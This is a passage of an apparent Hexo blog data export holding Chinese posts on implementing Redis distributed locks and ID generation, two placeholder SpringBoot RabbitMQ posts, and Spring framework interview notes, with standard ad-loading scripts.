不会成功，也就是只有一个客户端能持有锁。其次，我们可以对锁设置过期时间，即使锁的持有者后续发生了崩溃而没有解锁，锁也会因为到了过期时间自动解锁，不会发生死锁现象。 容错性方面我们可以通过redis cluster来保证锁的高可用及容错性。最后，我们将value设置为requestId，表示加锁的客户端标识，那么客户端解锁的时候就可以进行判断是否为同一个客户端。</p>\n<h5 id=\"加锁\"><a href=\"#加锁\" class=\"headerlink\" title=\"加锁\"></a>加锁</h5><p>我们用代码看一下怎么使用redis来实现分布式锁，非常简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryGetLock</span><span class=\"params\">(Jedis jedis, String lockKey, String requestId, <span class=\"keyword\">int</span> expire)</span> </span>&#123;</span><br><span class=\"line\">\tString result = jedis.set(lockKey, requestId, <span class=\"string\">\"NX\"</span>, <span class=\"string\">\"PX\"</span>, expire);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"string\">\"OK\"</span>.equals(result)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>; <span class=\"comment\">// 获取锁成功</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>; <span class=\"comment\">// 获取锁失败</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在网上有很多人使用jedis.setnx()和jedis.expire()组合实现加锁，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Long result = jedis.setnx(lockKey, requestId);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (result == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 如果在这里程序崩溃，则无法设置过期时间，将发生死锁</span></span><br><span class=\"line\">\tjedis.expire(lockKey, expire);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>乍一看和上面的set方法结果一样，其实不然，由于这是两条redis命令，不具有原子性，所以如果在setnx 之后程序崩溃，导致锁没有设置过期时间，可能会发生死锁。</p>\n<h5 id=\"解锁\"><a href=\"#解锁\" class=\"headerlink\" title=\"解锁\"></a>解锁</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">releaseLock</span><span class=\"params\">(Jedis jedis, String lockKey,String requestId)</span> </span>&#123;</span><br><span class=\"line\">\tString script = <span class=\"string\">\"if redis.call('get', KEY[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end\"</span>;</span><br><span class=\"line\">\tObject result = jedis.eval(script, Collections.singletonList(lockKey),Collections.singletonList(requestId));</span><br><span class=\"line\">\tLong success = <span class=\"number\">1L</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (success.equals(result)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解锁我们用一行Lua代码来实现，Lua代码的功能是获取锁对应的value，检查是否与requestId相等，如果相等则删除锁(解锁)。eval()方法是将Lua代码交给redis服务器执行。</p>\n<p>那为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的，而eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，直到eval命令执行完成，Redis才会执行其他命令。</p>\n<h4 id=\"分布式ID生成\"><a href=\"#分布式ID生成\" class=\"headerlink\" title=\"分布式ID生成\"></a>分布式ID生成</h4><p>我们再来看第二个场景–生成分布式ID，</p>\n<p>当使用数据库来生成ID性能不够的时候，可以尝试使用Redis来生成ID，这主要依赖Redis是单线程的，所以也可以用来生成全局唯一ID。可以用Redis的原子操作INCR和INCRBY来实现</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"Redis-数据结构\"><a href=\"#Redis-数据结构\" class=\"headerlink\" title=\"Redis 数据结构\"></a>Redis 数据结构</h3></div><br></div>\n\n<p>Redis是一个开源的内存数据结构存储系统，可以用做数据库，缓存，消息中间件等。Redis中常规的数据结构有5种，string、list、set、zset、hash，同时还有bitmaps、hyperloglogs、geospatial三种不常用的数据结构。</p>\n<p>我们经常把redis当作缓存来使用，但是本文只是基于五种常用的数据结构及其相关命令来讨论相关的应用场景，不涉及缓存。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h3></div><br></div>\n\n<p>首先先看一下Redis中String的操作命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET key value [expiration EX seconds | PX milliseconds] [NX|XX]</span><br><span class=\"line\">SETNX key value</span><br><span class=\"line\">SETEX key seconds value</span><br><span class=\"line\">PSETEX key milliseconds value</span><br><span class=\"line\">GET key</span><br><span class=\"line\">GETSET key value</span><br><span class=\"line\">STRLEN key</span><br><span class=\"line\">APPEND key value</span><br><span class=\"line\">SETRANGE key offseet value</span><br><span class=\"line\">GETRANGE key start end</span><br><span class=\"line\">INCR key</span><br><span class=\"line\">INCRBY key increment</span><br><span class=\"line\">INCRBYFLOAT key increment</span><br><span class=\"line\">DECR key</span><br><span class=\"line\">DECRBY key increment</span><br><span class=\"line\">MSET key value [key value ...]</span><br><span class=\"line\">MSETNX key value [key value ...]</span><br><span class=\"line\">MGET key [key ...]</span><br></pre></td></tr></table></figure>\n<p>命令具体的含义我这里就不一一赘述了。有想要了解的同学可以参考<a href=\"http://redisdoc.com/\" target=\"_blank\" rel=\"noopener\">Redis命令参考</a></p>\n<h4 id=\"分布式锁\"><a href=\"#分布式锁\" class=\"headerlink\" title=\"分布式锁\"></a>分布式锁</h4><p>我们看第一条命令，<code>SET key value [expiration EX seconds | PX milliseconds] [NX|XX]</code>。</p>\n<p>通过该命令我们可以实现基于redis的分布式锁，为了确保分布式锁可用，我们至少要确保锁的实现需要满足以下条件：</p>\n<ol>\n<li>互斥性，在任一时刻，只有一个客户端持有锁。</li>\n<li>不会发生死锁，即使有一个客户端在持有锁的期间崩溃而没有主动解锁，也能保证后续其他客户端能加锁。</li>\n<li>容错性，只要大部分Redis节点正常运行，客户端就可以加锁、解锁。</li>\n<li>解铃还须系铃人，加锁和解锁必须是同一个客户端，客户端不能把别人的锁给解了。</li>\n</ol>\n<p>那该命令如果保证确保分布式锁的可用性呢？</p>\n<p>首先，set 加入了NX参数，可以保证如果有key存在，则其他客户端set 不会成功，也就是只有一个客户端能持有锁。其次，我们可以对锁设置过期时间，即使锁的持有者后续发生了崩溃而没有解锁，锁也会因为到了过期时间自动解锁，不会发生死锁现象。 容错性方面我们可以通过redis cluster来保证锁的高可用及容错性。最后，我们将value设置为requestId，表示加锁的客户端标识，那么客户端解锁的时候就可以进行判断是否为同一个客户端。</p>\n<h5 id=\"加锁\"><a href=\"#加锁\" class=\"headerlink\" title=\"加锁\"></a>加锁</h5><p>我们用代码看一下怎么使用redis来实现分布式锁，非常简单。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">tryGetLock</span><span class=\"params\">(Jedis jedis, String lockKey, String requestId, <span class=\"keyword\">int</span> expire)</span> </span>&#123;</span><br><span class=\"line\">\tString result = jedis.set(lockKey, requestId, <span class=\"string\">\"NX\"</span>, <span class=\"string\">\"PX\"</span>, expire);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"string\">\"OK\"</span>.equals(result)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>; <span class=\"comment\">// 获取锁成功</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>; <span class=\"comment\">// 获取锁失败</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而在网上有很多人使用jedis.setnx()和jedis.expire()组合实现加锁，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Long result = jedis.setnx(lockKey, requestId);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (result == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 如果在这里程序崩溃，则无法设置过期时间，将发生死锁</span></span><br><span class=\"line\">\tjedis.expire(lockKey, expire);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>乍一看和上面的set方法结果一样，其实不然，由于这是两条redis命令，不具有原子性，所以如果在setnx 之后程序崩溃，导致锁没有设置过期时间，可能会发生死锁。</p>\n<h5 id=\"解锁\"><a href=\"#解锁\" class=\"headerlink\" title=\"解锁\"></a>解锁</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">releaseLock</span><span class=\"params\">(Jedis jedis, String lockKey,String requestId)</span> </span>&#123;</span><br><span class=\"line\">\tString script = <span class=\"string\">\"if redis.call('get', KEY[1]) == ARGV[1] then return redis.call('del',KEYS[1]) else return 0 end\"</span>;</span><br><span class=\"line\">\tObject result = jedis.eval(script, Collections.singletonList(lockKey),Collections.singletonList(requestId));</span><br><span class=\"line\">\tLong success = <span class=\"number\">1L</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (success.equals(result)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>解锁我们用一行Lua代码来实现，Lua代码的功能是获取锁对应的value，检查是否与requestId相等，如果相等则删除锁(解锁)。eval()方法是将Lua代码交给redis服务器执行。</p>\n<p>那为什么要使用Lua语言来实现呢？因为要确保上述操作是原子性的，而eval命令执行Lua代码的时候，Lua代码将被当成一个命令去执行，直到eval命令执行完成，Redis才会执行其他命令。</p>\n<h4 id=\"分布式ID生成\"><a href=\"#分布式ID生成\" class=\"headerlink\" title=\"分布式ID生成\"></a>分布式ID生成</h4><p>我们再来看第二个场景–生成分布式ID，</p>\n<p>当使用数据库来生成ID性能不够的时候，可以尝试使用Redis来生成ID，这主要依赖Redis是单线程的，所以也可以用来生成全局唯一ID。可以用Redis的原子操作INCR和INCRBY来实现</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"SpringBoot集成Rabbitmq(一)","date":"2019-04-11T07:50:25.000Z","_content":"\n## SpringBoot Rabbitmq 集成使用\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/SpringBoot集成Rabbitmq-一.md","raw":"---\ntitle: SpringBoot集成Rabbitmq(一)\ndate: 2019-04-11 15:50:25\ntags:\ncategories:\n---\n\n## SpringBoot Rabbitmq 集成使用\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"SpringBoot集成Rabbitmq-一","published":1,"updated":"2019-06-26T03:52:03.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gb000lo25t0sh36xrb","content":"<h2 id=\"SpringBoot-Rabbitmq-集成使用\"><a href=\"#SpringBoot-Rabbitmq-集成使用\" class=\"headerlink\" title=\"SpringBoot Rabbitmq 集成使用\"></a>SpringBoot Rabbitmq 集成使用</h2><p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SpringBoot-Rabbitmq-集成使用\"><a href=\"#SpringBoot-Rabbitmq-集成使用\" class=\"headerlink\" title=\"SpringBoot Rabbitmq 集成使用\"></a>SpringBoot Rabbitmq 集成使用</h2><p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"SpringBoot集成Rabbitmq(二)","date":"2019-04-11T07:50:31.000Z","_content":"\n## SpringBoot Rabbitmq 消息可靠性\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/SpringBoot集成Rabbitmq-二.md","raw":"---\ntitle: SpringBoot集成Rabbitmq(二)\ndate: 2019-04-11 15:50:31\ntags:\ncategories:\n---\n\n## SpringBoot Rabbitmq 消息可靠性\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"SpringBoot集成Rabbitmq-二","published":1,"updated":"2019-06-26T03:52:03.500Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gc000mo25t72vmic3o","content":"<h2 id=\"SpringBoot-Rabbitmq-消息可靠性\"><a href=\"#SpringBoot-Rabbitmq-消息可靠性\" class=\"headerlink\" title=\"SpringBoot Rabbitmq 消息可靠性\"></a>SpringBoot Rabbitmq 消息可靠性</h2><p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SpringBoot-Rabbitmq-消息可靠性\"><a href=\"#SpringBoot-Rabbitmq-消息可靠性\" class=\"headerlink\" title=\"SpringBoot Rabbitmq 消息可靠性\"></a>SpringBoot Rabbitmq 消息可靠性</h2><p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"Spring面试题","date":"2018-11-02T03:19:05.000Z","_content":"\n#### 1、consul的可靠性\n\n#### 2、spring的原理，AOP/IOC原理，使用场景\n\n#### 3、spring bean生命周期\n\n{% asset_img \"spring bean生命周期.jpg\" %}\n\n* 实例化一个Bean，也就是我们常说的new\n* 按照Spring上下文对实例化的Bean进行配置，即 IOC 注入\n* 如果这个Bean已经实现了BeanNameAware接口，会调用它实现的setBeanName(String)方法，此处传递的就是spring配置文件中Bean的ID值\n* 如果这个Bena已经实现了BeanFactoryAware接口，会调用它实现的setBeanFactory(BeanFactory)传递Spring工厂自身\n* 如果这个Bean已经实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文\n* 如果这个Bean关联了BenaPostProcessor接口，将会调用postProcessBeforeInitialization(Object obj, String s)方法，BeanPostPorcessor经常被用作Bean内容的更改，并且由于这个是在Bena初始化结束时调用哪个的方法，也可以被应用于内存或缓存技术。\n* 如果Bena在Spring配置文件中配置了init-method属性会自动调用其配置的初始化方法。\n* 如果这个Bean关联了BeanPostProcessor接口，将会调用postPorcessAfterInitialization(Object obj, String s)方法\n* 以上工作完成之后就可以应用这个Bean了，那这个Bean是一个Singleton的，所以一般情况下我们调用同一个ID的Bean会是在内容地址相同的实例，当然在Spring配置文件中也可以配置非Singleton\n* 当Bena不再需要时，会经过清理阶段，如果Bean实现了DisposableBena接口，会调用其实现的destroy()方法\n* 最后，如果这个Bean在Spring中配置了destroy-method属性，会自动调用其配置的销毁方法。\n\n\n#### 4、什么是依赖注入\nDI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。\n\n#### 5、Spring在SSM中起什么作用\n- spring： 是一个轻量级框架\n- 作用： Bean工厂，用来管理Bean的声明周期和框架集成\n- 两大核心： \n\t- IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory\n\t- AOP：面向切面编程\n\n#### 6、Spring的事务\n- 编程式事务： 编程方式管理事务，灵活，但难管理\n- 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务\n\n#### 7、IOC在项目中的作用\nIOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。\n\n#### 8、Spring DI的注入方式\n- 构造注入\n- set注入\n- 接口注入\n\n#### 9、IOC、AOP实现原理\n- IOC：通过反射机制生成对象进行注入\n- AOP：通过动态代理\n\n#### 10、Spring MVC的架构/工作流程图\n{% asset_img springmvc流程图.jpg %}\n\n#### 11、spring bean的作用域\n\nSpring中通过scope来配置Bean的作用域，scope有五个属性，用来描述不同的作用域\n* singleton： 使用该属性定义Bean时，IOC容器仅创建一个Bean实例，IOC容器每次返回的是同一个Bean实例。\n* prototype：使用该属性定义Bean时，IOC容器可以创建多个Bean实例，每次返回的都是一个新的实例。\n* request：该属性仅对HTTP请求产生作用，使用该属性定义Bean时，每次HTTP请求都会创建一个新的Bean，适用于WebApplicationContext环境。\n* session： 该属性仅用于HTTP Session，同一个Session共享一个Bean实例。不同的Session使用不同的实例。\n\n* global-session： 该属性仅用于HTTP Session，同Session作用域不同的是，所有的session共享一个Bean实例。\n\n#### 12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\n\n#### 13、如何自定义一个spirng boot starter\n\n#### 24、Servlet的生命周期\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Spring面试题.md","raw":"---\ntitle: Spring面试题\ndate: 2018-11-02 11:19:05\ntags:\ncategories:\n---\n\n#### 1、consul的可靠性\n\n#### 2、spring的原理，AOP/IOC原理，使用场景\n\n#### 3、spring bean生命周期\n\n{% asset_img \"spring bean生命周期.jpg\" %}\n\n* 实例化一个Bean，也就是我们常说的new\n* 按照Spring上下文对实例化的Bean进行配置，即 IOC 注入\n* 如果这个Bean已经实现了BeanNameAware接口，会调用它实现的setBeanName(String)方法，此处传递的就是spring配置文件中Bean的ID值\n* 如果这个Bena已经实现了BeanFactoryAware接口，会调用它实现的setBeanFactory(BeanFactory)传递Spring工厂自身\n* 如果这个Bean已经实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文\n* 如果这个Bean关联了BenaPostProcessor接口，将会调用postProcessBeforeInitialization(Object obj, String s)方法，BeanPostPorcessor经常被用作Bean内容的更改，并且由于这个是在Bena初始化结束时调用哪个的方法，也可以被应用于内存或缓存技术。\n* 如果Bena在Spring配置文件中配置了init-method属性会自动调用其配置的初始化方法。\n* 如果这个Bean关联了BeanPostProcessor接口，将会调用postPorcessAfterInitialization(Object obj, String s)方法\n* 以上工作完成之后就可以应用这个Bean了，那这个Bean是一个Singleton的，所以一般情况下我们调用同一个ID的Bean会是在内容地址相同的实例，当然在Spring配置文件中也可以配置非Singleton\n* 当Bena不再需要时，会经过清理阶段，如果Bean实现了DisposableBena接口，会调用其实现的destroy()方法\n* 最后，如果这个Bean在Spring中配置了destroy-method属性，会自动调用其配置的销毁方法。\n\n\n#### 4、什么是依赖注入\nDI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。\n\n#### 5、Spring在SSM中起什么作用\n- spring： 是一个轻量级框架\n- 作用： Bean工厂，用来管理Bean的声明周期和框架集成\n- 两大核心： \n\t- IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory\n\t- AOP：面向切面编程\n\n#### 6、Spring的事务\n- 编程式事务： 编程方式管理事务，灵活，但难管理\n- 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务\n\n#### 7、IOC在项目中的作用\nIOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。\n\n#### 8、Spring DI的注入方式\n- 构造注入\n- set注入\n- 接口注入\n\n#### 9、IOC、AOP实现原理\n- IOC：通过反射机制生成对象进行注入\n- AOP：通过动态代理\n\n#### 10、Spring MVC的架构/工作流程图\n{% asset_img springmvc流程图.jpg %}\n\n#### 11、spring bean的作用域\n\nSpring中通过scope来配置Bean的作用域，scope有五个属性，用来描述不同的作用域\n* singleton： 使用该属性定义Bean时，IOC容器仅创建一个Bean实例，IOC容器每次返回的是同一个Bean实例。\n* prototype：使用该属性定义Bean时，IOC容器可以创建多个Bean实例，每次返回的都是一个新的实例。\n* request：该属性仅对HTTP请求产生作用，使用该属性定义Bean时，每次HTTP请求都会创建一个新的Bean，适用于WebApplicationContext环境。\n* session： 该属性仅用于HTTP Session，同一个Session共享一个Bean实例。不同的Session使用不同的实例。\n\n* global-session： 该属性仅用于HTTP Session，同Session作用域不同的是，所有的session共享一个Bean实例。\n\n#### 12、spring boot比psinrg做了哪些改进？spring5比spring4做了哪些改进？\n\n#### 13、如何自定义一个spirng boot starter\n\n#### 24、Servlet的生命周期\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Spring面试题","published":1,"updated":"2019-06-26T03:52:03.501Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2gg000qo25t851qjfed","content":"<h4 id=\"1、consul的可靠性\"><a href=\"#1、consul的可靠性\" class=\"headerlink\" title=\"1、consul的可靠性\"></a>1、consul的可靠性</h4><h4 id=\"2、spring的原理，AOP-IOC原理，使用场景\"><a href=\"#2、spring的原理，AOP-IOC原理，使用场景\" class=\"headerlink\" title=\"2、spring的原理，AOP/IOC原理，使用场景\"></a>2、spring的原理，AOP/IOC原理，使用场景</h4><h4 id=\"3、spring-bean生命周期\"><a href=\"#3、spring-bean生命周期\" class=\"headerlink\" title=\"3、spring bean生命周期\"></a>3、spring bean生命周期</h4><img src=\"/posts/2018-11-02-Spring面试题/spring%20bean生命周期.jpg\">\n<ul>\n<li>实例化一个Bean，也就是我们常说的new</li>\n<li>按照Spring上下文对实例化的Bean进行配置，即 IOC 注入</li>\n<li>如果这个Bean已经实现了BeanNameAware接口，会调用它实现的setBeanName(String)方法，此处传递的就是spring配置文件中Bean的ID值</li>\n<li>如果这个Bena已经实现了BeanFactoryAware接口，会调用它实现的setBeanFactory(BeanFactory)传递Spring工厂自身</li>\n<li>如果这个Bean已经实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文</li>\n<li>如果这个Bean关联了BenaPostProcessor接口，将会调用postProcessBeforeInitialization(Object obj, String s)方法，BeanPostPorcessor经常被用作Bean内容的更改，并且由于这个是在Bena初始化结束时调用哪个的方法，也可以被应用于内存或缓存技术。</li>\n<li>如果Bena在Spring配置文件中配置了init-method属性会自动调用其配置的初始化方法。</li>\n<li>如果这个Bean关联了BeanPostProcessor接口，将会调用postPorcessAfterInitialization(Object obj, String s)方法</li>\n<li>以上工作完成之后就可以应用这个Bean了，那这个Bean是一个Singleton的，所以一般情况下我们调用同一个ID的Bean会是在内容地址相同的实例，当然在Spring配置文件中也可以配置非Singleton</li>\n<li>当Bena不再需要时，会经过清理阶段，如果Bean实现了DisposableBena接口，会调用其实现的destroy()方法</li>\n<li>最后，如果这个Bean在Spring中配置了destroy-method属性，会自动调用其配置的销毁方法。</li>\n</ul>\n<h4 id=\"4、什么是依赖注入\"><a href=\"#4、什么是依赖注入\" class=\"headerlink\" 